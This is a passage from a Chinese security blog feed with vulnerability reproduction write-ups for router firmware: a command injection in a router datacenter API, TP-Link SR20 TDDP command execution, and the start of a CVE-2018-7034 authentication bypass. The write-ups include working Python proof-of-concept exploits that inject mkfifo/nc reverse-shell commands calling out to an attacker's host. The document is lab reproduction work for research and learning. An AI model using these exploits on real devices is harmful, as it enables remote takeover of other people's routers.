class="keyword">if</span> L7 <span class="keyword">then</span></span><br><span class="line">      L7 = empower</span><br><span class="line">      L8 = <span class="string">&quot;1&quot;</span></span><br><span class="line">      L9 = <span class="string">&quot;1&quot;</span></span><br><span class="line">      L10 = <span class="literal">nil</span></span><br><span class="line">      L7(L8, L9, L10)</span><br><span class="line">      L7 = <span class="string">&quot;2&quot;</span></span><br><span class="line">      L8 = luci</span><br><span class="line">      L8 = L8.http</span><br><span class="line">      L8 = L8.header</span><br><span class="line">      L9 = <span class="string">&quot;Set-Cookie&quot;</span></span><br><span class="line">      L10 = <span class="string">&quot;psp=&quot;</span></span><br><span class="line">      L11 = L4</span><br><span class="line">      L12 = <span class="string">&quot;|||&quot;</span></span><br><span class="line">      L13 = L7</span><br><span class="line">      L14 = <span class="string">&quot;|||0;path=/;&quot;</span></span><br><span class="line">      L10 = L10 .. L11 .. L12 .. L13 .. L14</span><br><span class="line">      L8(L9, L10)</span><br><span class="line">      L8 = L4</span><br><span class="line">      L9 = L7</span><br><span class="line">      <span class="keyword">return</span> L8, L9</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      L7 = context</span><br><span class="line">      L8 = &#123;&#125;</span><br><span class="line">      L7.<span class="built_in">path</span> = L8</span><br><span class="line">      L7 = luci</span><br><span class="line">      L7 = L7.http</span><br><span class="line">      L7 = L7.<span class="built_in">write</span></span><br><span class="line">      L8 = <span class="string">&quot;&#123;\&quot;code\&quot;:401,\&quot;msg\&quot;:\&quot;Invalid token\&quot;&#125;&quot;</span></span><br><span class="line">      L7(L8)</span><br><span class="line">      L7 = <span class="literal">false</span></span><br><span class="line">      <span class="keyword">return</span> L7</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  L7 = context</span><br><span class="line">  L8 = &#123;&#125;</span><br><span class="line">  L7.<span class="built_in">path</span> = L8</span><br><span class="line">  L7 = luci</span><br><span class="line">  L7 = L7.http</span><br><span class="line">  L7 = L7.<span class="built_in">write</span></span><br><span class="line">  L8 = <span class="string">&quot;&#123;\&quot;code\&quot;:401,\&quot;msg\&quot;:\&quot;not auth\&quot;&#125;&quot;</span></span><br><span class="line">  L7(L8)</span><br><span class="line">  L7 = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">return</span> L7</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">L10.jsonauth = L11</span><br></pre></td></tr></table></figure><p>可以看到这就是鉴权的函数，首先引入XQSysUtil模块，用于系统工具函数，之后便是获取 HTTP 请求中的 <code>username</code>, <code>password</code>, <code>nonce</code> 参数，如果有nonce参数，那么就调用<code>_UPVALUE0_.checkNonce</code>函数来检查nonce参数，如果通过checknonce的检查就会执行checkUser(usrname,nonce,password)，也通过了那就正常返回，不然就失败。因此要通过两个函数的检查，checknonce便不必多说，只看checkUser函数</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L13</span><span class="params">(A0, A1, A2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L3, L4, L5, L6, L7, L8, L9</span><br><span class="line">  L3 = _UPVALUE0_</span><br><span class="line">  L3 = L3.get</span><br><span class="line">  L4 = A0</span><br><span class="line">  L5 = <span class="literal">nil</span></span><br><span class="line">  L6 = <span class="string">&quot;account&quot;</span></span><br><span class="line">  L3 = L3(L4, L5, L6)</span><br><span class="line">  <span class="keyword">if</span> L3 <span class="keyword">then</span></span><br><span class="line">    L4 = _UPVALUE1_</span><br><span class="line">    L4 = L4.isStrNil</span><br><span class="line">    L5 = A2</span><br><span class="line">    L4 = L4(L5)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> L4 <span class="keyword">then</span></span><br><span class="line">      L4 = _UPVALUE1_</span><br><span class="line">      L4 = L4.isStrNil</span><br><span class="line">      L5 = A1</span><br><span class="line">      L4 = L4(L5)</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> L4 <span class="keyword">then</span></span><br><span class="line">        L4 = _UPVALUE2_</span><br><span class="line">        L4 = L4.sha1</span><br><span class="line">        L5 = A1</span><br><span class="line">        L6 = L3</span><br><span class="line">        L5 = L5 .. L6</span><br><span class="line">        L4 = L4(L5)</span><br><span class="line">        <span class="keyword">if</span> L4 == A2 <span class="keyword">then</span></span><br><span class="line">          L4 = <span class="literal">true</span></span><br><span class="line">          <span class="keyword">return</span> L4</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  L4 = _UPVALUE3_</span><br><span class="line">  L4 = L4.<span class="built_in">log</span></span><br><span class="line">  L5 = <span class="number">4</span></span><br><span class="line">  L6 = luci</span><br><span class="line">  L6 = L6.http</span><br><span class="line">  L6 = L6.<span class="built_in">getenv</span></span><br><span class="line">  L7 = <span class="string">&quot;REMOTE_ADDR&quot;</span></span><br><span class="line">  L6 = L6(L7)</span><br><span class="line">  L6 = L6 <span class="keyword">or</span> L6</span><br><span class="line">  L7 = <span class="string">&quot; Authentication failed&quot;</span></span><br><span class="line">  L6 = L6 .. L7</span><br><span class="line">  L7 = A1</span><br><span class="line">  L8 = L3</span><br><span class="line">  L9 = A2</span><br><span class="line">  L4(L5, L6, L7, L8, L9)</span><br><span class="line">  L4 = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">return</span> L4</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">checkUser = L13</span><br></pre></td></tr></table></figure><p>首先用get函数获得account.comman.usrname，要求不为空，然后通过与Post报文传入的nonce现时字段拼接后sha1哈希加密之后便是Post报文中的密码了，那我们来看Post报文的密码字段</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657081.png" alt="image-20240712102435885"></p><p>可以看到用户名恒为admin，然后password要通过oldpw来加密</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657083.png" alt="image-20240712102549234"></p><p>可以看到它return了一个sha1加密内容是（nonce字段+sha1(pwd+key)）Key便是上面的一串，pwd便是传入的密码，由于在lua文件中处理密码也会加拼接上一个nonce字段，那相当于是没拼接，那么只需要我们的account.common.admin是sha1(s1nec-1o+key)，那么我们的密码便是s1nec-1o了</p><p>由于本文的cve是授权后的，因此要有密码才可以复现</p><p>鉴权完成之后那我们就要继续研究漏洞了，还是看到api控制模块的</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">L1 = entry                                   <span class="comment">--request processing</span></span><br><span class="line">L2 = &#123;&#125;</span><br><span class="line">L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">L5 = <span class="string">&quot;request&quot;</span></span><br><span class="line">L2[<span class="number">1</span>] = L3</span><br><span class="line">L2[<span class="number">2</span>] = L4</span><br><span class="line">L2[<span class="number">3</span>] = L5</span><br><span class="line">L3 = call</span><br><span class="line">L4 = <span class="string">&quot;tunnelRequest&quot;</span></span><br><span class="line">L3 = L3(L4)</span><br><span class="line">L4 = _</span><br><span class="line">L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">L4 = L4(L5)</span><br><span class="line">L5 = <span class="number">301</span></span><br><span class="line">L1(L2, L3, L4, L5)    <span class="comment">---entry( &#123;&quot;api&quot;,&quot;xqdatacenter&quot;,&quot;request&quot;&#125; , call(tunnelRequest) , _&quot;&quot; , 301 )</span></span><br></pre></td></tr></table></figure><p>其中在访问xqdatacenter该节点的时候会call(tunnelRequest)来对json数据进行解析</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L5</span><span class="params">()</span></span>          <span class="comment">--tunnelRequest Function</span></span><br><span class="line">  <span class="keyword">local</span> L0, L1, L2, L3, L4, L5, L6, L7, L8</span><br><span class="line">  L0 = <span class="built_in">require</span></span><br><span class="line">  L1 = <span class="string">&quot;xiaoqiang.util.XQCryptoUtil&quot;</span></span><br><span class="line">  L0 = L0(L1)         <span class="comment">--load xiaoqiang.util.XQCryptoUtil module</span></span><br><span class="line">  L1 = L0.binaryBase64Enc              <span class="comment">--call binaryBase64Enc Function</span></span><br><span class="line">  L2 = _UPVALUE0_</span><br><span class="line">  L2 = L2.formvalue_unsafe</span><br><span class="line">  L3 = <span class="string">&quot;payload&quot;</span></span><br><span class="line">  L2, L3, L4, L5, L6, L7, L8 = L2(L3)       <span class="comment">--formvalue_unsafe(payload)</span></span><br><span class="line">  L1 = L1(L2, L3, L4, L5, L6, L7, L8)       <span class="comment">--Base func retuen L1</span></span><br><span class="line">  L2 = _UPVALUE1_</span><br><span class="line">  L2 = L2.THRIFT_TUNNEL_TO_DATACENTER       <span class="comment">--thrifttunnel 0 &#x27;%s&#x27;</span></span><br><span class="line">  L2 = L2 % L1                              <span class="comment">---L1 tick to L2</span></span><br><span class="line">  L3 = <span class="built_in">require</span></span><br><span class="line">  L4 = <span class="string">&quot;luci.util&quot;</span></span><br><span class="line">  L3 = L3(L4)            <span class="comment">--load luci.util module</span></span><br><span class="line">  L4 = _UPVALUE0_</span><br><span class="line">  L4 = L4.<span class="built_in">write</span></span><br><span class="line">  L5 = L3.exec</span><br><span class="line">  L6 = L2</span><br><span class="line">  L5 = L5(L6)   <span class="comment">--luci.util&#x27;s exec Func (tunnel cmd)</span></span><br><span class="line">  L6 = <span class="literal">nil</span></span><br><span class="line">  L7 = <span class="literal">false</span></span><br><span class="line">  L8 = <span class="literal">true</span></span><br><span class="line">  L4(L5, L6, L7, L8)   <span class="comment">--write may ret</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">tunnelRequest = L5</span><br></pre></td></tr></table></figure><p>其中调用了XQCryptoUtil的binaryBase64Enc和formvalue_unsafe，猜测是先base64加密然后用formvalue_unsafe来获取内容吧，显然是一个危险函数，未过滤危险字符，而THRIFT_TUNNEL_TO_DATACENTER的含义可以在&#x2F;usr&#x2F;lib&#x2F;lua&#x2F;xiaoqiang&#x2F;common&#x2F;XQConfigs.lua中找到<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657084.png" alt="image-20240712104352614" style="zoom:50%;" /></p><p>因此最终的string是<code>thrifttunnel 0 &#39;base64加密的payload&#39;</code>之后使用luci.util的exec来执行该命令，因此payload字段中被Base64编码的json数据会被传入thrifttunnel程序中且opetion为0</p><h2 id="二进制文件分析"><a href="#二进制文件分析" class="headerlink" title="二进制文件分析"></a>二进制文件分析</h2><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657085.png" alt="image-20240712110152526"></p><p>会发现在thrifttunnel程序中他将数据发送到了本地端的9090端口，而&#x2F;usr&#x2F;lib&#x2F;datacenter程序一直监听着9090端口，因此我们的数据会到datacenter中去处理</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657086.png" alt="image-20240712110442769"></p><p>这个函数显然就是监听的函数，看datacenter的request函数</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657087.png" alt="image-20240712163626431"></p><p>调用了APIMapping和redirectRequest函数</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657088.png" alt="image-20240712163658072"></p><p>APIMaping中调用了constructAPIMappingTable函数，它建立起了api和handle函数之间的关系</p><p>在redirect函数中<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657089.png" alt="image-20240712164126303"></p><p>先获取json对象的api字段的值，存放在v8变量中，之后的循环时map.find()的调用的反汇编，其中偏移+32是第一个键值即api，+40便是对应的handle函数指针，因此显然可以知道上面便是api为多少就会调用哪里的函数</p><p>看到漏洞所在处，可以知道当api为629时出问题，看到api为629的地方</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657090.png" alt="image-20240712164540707"></p><p>看函数调用关系可以找到<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657091.png" alt="image-20240712164623136"></p><p>它连接了9091端口，然后发现plugincenter监听了9091端口，可以得知数据会被转发到plugincenter来处理</p><p>找到plugincenter然后看sConstructMappingTable函数，就可以找到当api为629调用了parseGetIdForVendor函数</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657092.png" alt="image-20240712164913808"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657093.png" alt="image-20240712165122840"></p><p>发现就算是非法的app id也会拼接到命令然后执行，因此就有个任意命令执行的漏洞</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/datacenter &amp;</span><br><span class="line">/usr/sbin/plugincenter &amp;</span><br></pre></td></tr></table></figure><p>先将服务开启</p><p>然后执行Poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">server_ip = <span class="string">&quot;192.168.50.1&quot;</span></span><br><span class="line">client_ip = <span class="string">&quot;192.168.50.105&quot;</span></span><br><span class="line">token = <span class="string">&quot;814c55713043e7358d3c1f42f2a98438&quot;</span></span><br><span class="line"></span><br><span class="line">nc_shell = <span class="string">&quot;;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &#123;&#125; 8888 &gt;/tmp/f;&quot;</span>.<span class="built_in">format</span>(client_ip)</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&quot;http://&#123;&#125;/cgi-bin/luci/;stok=&#123;&#125;/api/xqdatacenter/request&quot;</span>.<span class="built_in">format</span>(server_ip, token), data=&#123;<span class="string">&#x27;payload&#x27;</span>:<span class="string">&#x27;&#123;&quot;api&quot;:629, &quot;appid&quot;:&quot;&#x27;</span> + nc_shell + <span class="string">&#x27;&quot;&#125;&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>此时做到反弹shell了</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://forum.butian.net/share/3000">https://forum.butian.net/share/3000</a></p><p><a href="https://bbs.kanxue.com/thread-282034.htm">https://bbs.kanxue.com/thread-282034.htm</a></p><p><a href="https://zikh26.github.io/posts/3d9490d.html">https://zikh26.github.io/posts/3d9490d.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个cve是我至今以来复现的最为复杂的漏洞了，winmt真神！&lt;/p&gt;
&lt;h2 id=&quot;固件仿真&quot;&gt;&lt;a href=&quot;#固件仿真&quot; class=&quot;headerlink&quot; title=&quot;固件仿真&quot;&gt;&lt;/a&gt;固件仿真&lt;/h2&gt;&lt;p&gt;首先固件的提取可以看&lt;a href=&quot;http</summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>TP-Link SR20命令执行漏洞复现</title>
    <link href="http://s1nec-1o.github.io/2024/07/09/TP-Link-SR20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2024/07/09/TP-Link-SR20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-07-09T10:31:57.000Z</published>
    <updated>2024-07-09T10:33:18.195Z</updated>
    
    <content type="html"><![CDATA[<p>这个漏洞的成因是因为他的TDDP本身协议有任意命令执行的漏洞</p><h2 id="TDDP协议"><a href="#TDDP协议" class="headerlink" title="TDDP协议"></a>TDDP协议</h2><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832867.png" alt="image-20240709180753701"></p><p>基于UDP协议，端口为1040端口</p><p>以上为TDDP协议的报头，第一个字节为version，即版本。tddp协议有两个版本：<code>version1</code>和<code>version2</code>。其中<code>version1</code>不支持身份验证和对数据包载荷的加密，而<code>version2</code>要求身份验证和加密。也正是因为<code>version1</code>不要求身份的认证即可对设备进行调试，导致出现漏洞。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>是arm32小端，已经qemu过很多固件了，就不再多赘述，也不会很复杂</p><p>启动脚本如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line">    -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">    -initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">    -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span> \</span><br><span class="line">    -net nic -net tap \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><h2 id="二进制文件的分析"><a href="#二进制文件的分析" class="headerlink" title="二进制文件的分析"></a>二进制文件的分析</h2><p>首先是由tddp协议出问题，然后是0x31的type</p><p>在&#x2F;usr&#x2F;bin&#x2F;tddp里</p><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832868.png" alt="image-20240709181137853"></p><p>main函数中有三个函数，大致看一眼发现，sub_16C90是初始化堆块，sub_16D40是释放内存，那么主要的操作在sub_93C6</p><h3 id="sub-93C6"><a href="#sub-93C6" class="headerlink" title="sub_93C6"></a>sub_93C6</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832869.png" alt="image-20240709181427771"></p><p>他的主要处理是来自tddp_type_handle函数</p><h3 id="tddp-type-handle"><a href="#tddp-type-handle" class="headerlink" title="tddp_type_handle"></a>tddp_type_handle</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832870.png" alt="image-20240709181523845"></p><p>看version为1的情况</p><h3 id="tddp-type-version1-handle"><a href="#tddp-type-version1-handle" class="headerlink" title="tddp_type_version1_handle"></a>tddp_type_version1_handle</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832871.png" alt="image-20240709181605477"></p><p>进来发现是处理type的部分，那么找到0x31的部分进入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x31</span>:</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] TDDPv1: receive CMD_FTEST_CONFIG\n&quot;</span>, <span class="string">&quot;tddp_parserVerOneOpt&quot;</span>, <span class="number">692</span>);</span><br><span class="line">  v9 = sub_A580((<span class="type">int</span>)a1);</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>主要是sub_A580函数</p><h3 id="sub-A580"><a href="#sub-A580" class="headerlink" title="sub_A580"></a>sub_A580</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832872.png" alt="image-20240709181955545"></p><p>由这里可以知道，主要是从version+12开始会组合一个命令执行</p><p>其中sub_91DC函数中</p><h3 id="sub-91DC"><a href="#sub-91DC" class="headerlink" title="sub_91DC"></a>sub_91DC</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832873.png" alt="image-20240709182052280"></p><p>会执行sh -c s</p><p>其中s是传入的命令执行，那么我们可以通过|分割来进行任意命令执行</p><p>并且还有一种方式</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832874.png" alt="image-20240709182211053"></p><p>会用tftp下载一个文件，然后通过lua的方式执行config_test函数，那么我们就可以本地伪造一个lua文件其中包括一个config_test函数，也能实现任意命令执行</p><p>那么这样看来payload还是很好写的</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payloda=<span class="string">&quot;/x01/x31&quot;</span>.ljust(<span class="string">b&#x27;\x00&#x27;</span>,<span class="number">12</span>)+command</span><br></pre></td></tr></table></figure><p>那么就可以简单的复现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">ss= socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x01\x31&#x27;</span>.ljust(<span class="number">12</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&quot;| mkfifo /tmp/fifo | sh -i &lt; /tmp/fifo | nc 192.168.121.112 8888 &gt; /tmp/fifo |;s1nec-1o&quot;</span></span><br><span class="line">ss.sendto(payload, (ip, <span class="number">1040</span>))</span><br><span class="line">ss.close()</span><br></pre></td></tr></table></figure><p>由于反弹shell如此麻烦是因为我传入的是busybox的nc，它的使用方法较少，这是能想到的一个方法，但是反弹出来会显示段错误，不懂，但想来如果是真机也不用如此麻烦，或者将宿主机的nc传入吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">tddp_port = <span class="number">1040</span></span><br><span class="line">ip = sys.argv[<span class="number">1</span>] <span class="comment"># 192.168.192.130 (QEMU虚拟机的IP)</span></span><br><span class="line">command = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">s_send = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x01\x31&#x27;</span>.ljust(<span class="number">12</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&quot;%s;winmt&quot;</span> % command</span><br><span class="line">s_send.sendto(payload, (ip, tddp_port))</span><br><span class="line">s_send.close()</span><br></pre></td></tr></table></figure><p>还得是winmt，脚本都那么优雅</p><p>至于lua文件的执行，想来也是差不多的编写脚本思路</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.iotsec-zone.com/article/384#tp-link-sr20-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">winmt</a></p><p><a href="https://xz.aliyun.com/t/6073?time__1311=n4+xnD0DgDcmG=N0QD/iW4BKGQYw4gouDDv5PQx#toc-0">TP Link SR20 ACE漏洞分析 - 先知社区 (aliyun.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个漏洞的成因是因为他的TDDP本身协议有任意命令执行的漏洞&lt;/p&gt;
&lt;h2 id=&quot;TDDP协议&quot;&gt;&lt;a href=&quot;#TDDP协议&quot; class=&quot;headerlink&quot; title=&quot;TDDP协议&quot;&gt;&lt;/a&gt;TDDP协议&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https:</summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-7034复现</title>
    <link href="http://s1nec-1o.github.io/2024/07/08/CVE-2018-7034%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2024/07/08/CVE-2018-7034%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-07-08T04:40:48.000Z</published>
    <updated>2024-07-08T04:44:26.135Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244908.png" alt="image-20240708110008200"></p><p>通过使用 <code>AUTHORIZED_GROUP=1</code> 值，攻击者可以绕过认证，如通过请求 <code>getcfg.php</code> 进行信息泄露</p><p>这个cve的成因，主要是因为解析%xx和判断环境变量的不严谨导致的，以下分析</p><h2 id="php文件的分析"><a href="#php文件的分析" class="headerlink" title="php文件的分析"></a>php文件的分析</h2><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244910.png" alt="image-20240708110317494"></p><p>可以看到如果Authorized_group&gt;&#x3D;0即代表用户授权，可以加载一个file，而这个file是<code>&quot;/htdocs/webinc/getcfg/&quot;.$GETCFG_SVC.&quot;.xml.php&quot;</code>的格式，那么我们看到在该目录下的以.xml.php为后缀的文件，<code>DEVICE.ACCOUNT.xml.php</code> 该文件可以泄露用户名和密码等信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="string">&quot;/device/account/entry&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$InDeX</span> &gt; <span class="variable">$cnt</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t&lt;entry&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;uid&gt;&quot;</span>.<span 